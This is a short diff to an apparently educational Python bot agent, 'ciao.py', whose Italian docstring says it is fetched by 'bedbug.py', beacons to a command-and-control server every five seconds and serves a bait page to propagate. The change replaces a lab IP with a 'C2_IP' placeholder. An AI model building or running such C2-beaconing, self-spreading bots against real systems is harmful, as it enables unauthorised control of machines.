@@ -1,7 +1,7 @@
 """
 ciao.py - Bot Agent (cs33)
 
-Scaricato da bedbug.py via http://192.168.1.21:8081/ciao.py
+Scaricato da bedbug.py via http://C2_IP:8081/ciao.py
 Contatta sergio ogni 5 secondi (beaconing).
 Apre seed server su :9090 con pagina bait per propagazione.
 
@@ -17,7 +17,7 @@ import threading
 from datetime import datetime
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-SERGIO_HOST = "http://192.168.1.21:8080"
+SERGIO_HOST = "http://C2_IP:8080"
 BEACON_INTERVAL = 5
 
 now = datetime.now()
